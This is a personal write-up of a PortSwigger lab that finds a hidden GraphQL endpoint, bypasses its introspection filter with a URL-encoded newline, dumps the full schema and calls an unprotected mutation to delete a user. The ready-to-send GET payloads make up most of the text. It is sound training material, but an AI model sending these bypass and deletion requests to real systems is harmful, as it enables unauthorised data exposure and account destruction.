# Finding a hidden GraphQL endpoint — (PortSwigger — Practitioner)
**Date:** 2026-08-08
 
---
 
## Vulnerability / core concept
GraphQL with Information Disclosure

---


## Payload / key command
This web application has a hidden GraphQL endpoint which cannot discovered through normal navigation in the browser. Therefore, we need to use content-discovery to find that endpoint - we found out the graphql is on `/api` endpoint.

First thing we notice is that we cannot use POST requets, we have to use GET. After changing request method to GET, we send our introspection probe to see if it is enabled in production. We get the following error:
```js
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```
Web application uses some kind of filtering which does not allow to use `__schema` or `__type`. We can bypass this with `%0A` (URL-encoded new-line) by sending a GET request with following query:
```bash
GET /api?query=query{__schema%0A{queryType{name}}} HTTP/2
```
Now, given that we can query `__schema` we can look for all schema information using the following query:
```bash
GET /api?query=query%20IntrospectionQuery%20%7B%20%5F%5Fschema%0A%20%7B%20queryType%20%7B%20name%20%7D%20mutationType%20%7B%20name%20%7D%20subscriptionType%20%7B%20name%20%7D%20types%20%7B%20%2E%2E%2EFullType%20%7D%20directives%20%7B%20name%20description%20args%20%7B%20%2E%2E%2EInputValue%20%7D%20locations%20%7D%20%7D%20%7D%20fragment%20FullType%20on%20%5F%5FType%20%7B%20kind%20name%20description%20fields(includeDeprecated:%20true)%20%7B%20name%20description%20args%20%7B%20%2E%2E%2EInputValue%20%7D%20type%20%7B%20%2E%2E%2ETypeRef%20%7D%20isDeprecated%20deprecationReason%20%7D%20inputFields%20%7B%20%2E%2E%2EInputValue%20%7D%20interfaces%20%7B%20%2E%2E%2ETypeRef%20%7D%20enumValues(includeDeprecated:%20true)%20%7B%20name%20description%20isDeprecated%20deprecationReason%20%7D%20possibleTypes%20%7B%20%2E%2E%2ETypeRef%20%7D%20%7D%20fragment%20InputValue%20on%20%5F%5FInputValue%20%7B%20name%20description%20type%20%7B%20%2E%2E%2ETypeRef%20%7D%20defaultValue%20%7D%20fragment%20TypeRef%20on%20%5F%5FType%20%7B%20kind%20name%20ofType%20%7B%20kind%20name%20ofType%20%7B%20kind%20name%20ofType%20%7B%20kind%20name%20%7D%20%7D%20%7D%20%7D HTTP/2
```

This gives us a response with full detailed information about the whole schema. Inspecting it gives us several interesting properties: `getUser` query which we can use to find user `carlos` by trying different ids, `deleteOrganizationUser` mutation which lets us delete any user we want (except administrator).

Having these properties we can find user `carlos` (his id is 3)  and delete his account to solve this lab by using this query:
```bash
GET /api?query=mutation%20%7B%20deleteOrganizationUser(input:%20%7B%20id:%203%20%7D)%20%7B%20user%20%7B%20id%20username%20%7D%20%7D%20%7D HTTP/2
```
